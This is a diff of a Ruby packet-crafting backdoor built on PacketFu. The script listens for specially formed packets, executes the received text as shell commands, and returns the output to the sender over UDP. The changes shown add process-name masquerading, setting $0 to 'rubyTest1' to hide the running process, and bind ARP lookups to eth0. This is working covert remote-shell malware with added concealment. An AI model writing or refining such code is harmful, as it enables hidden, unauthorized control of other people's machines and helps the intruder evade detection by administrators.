@@ -17,6 +17,7 @@ def loadConfig(filePath)
 	filterTCP = "tcp and port #{listenPortMain}"
 	$userCmdField = "src-port" # Options: src-port, dst-port
 	$userCmdRun = "20"
+	$procName = "rubyTest1"
 end
 
 # Function for handling client session
@@ -123,7 +124,7 @@ end
 
 def udpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,payload)
 	pkt = PacketFu::UDPPacket.new(:config => $config , :flavor => "Linux")
-	dstMAC = PacketFu::Utils::arp(dstIP)
+	dstMAC = PacketFu::Utils::arp(dstIP, :iface=>"eth0")
 	pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
 	pkt.eth_dst =   PacketFu::EthHeader::mac2str(dstMAC)
     #- Build IP header:---------------------------------------
@@ -235,6 +236,7 @@ def dataListener(identKey,dstIP,dstPort)
 	else
 		# Not a file, so Execute the command
 		input = `#{finalData}`
+		# Send back the response
 		sendUDPData(input,srcIP,dstIP)
 	end
 end
@@ -242,6 +244,8 @@ end
 
 # Get config from file
 loadConfig("/path/to/file.txt")
+# Change the process name
+$0=$procName
 
 $config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $iName)).config # set interface
 #$config = PacketFu::Config.new(:iface=> $iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)
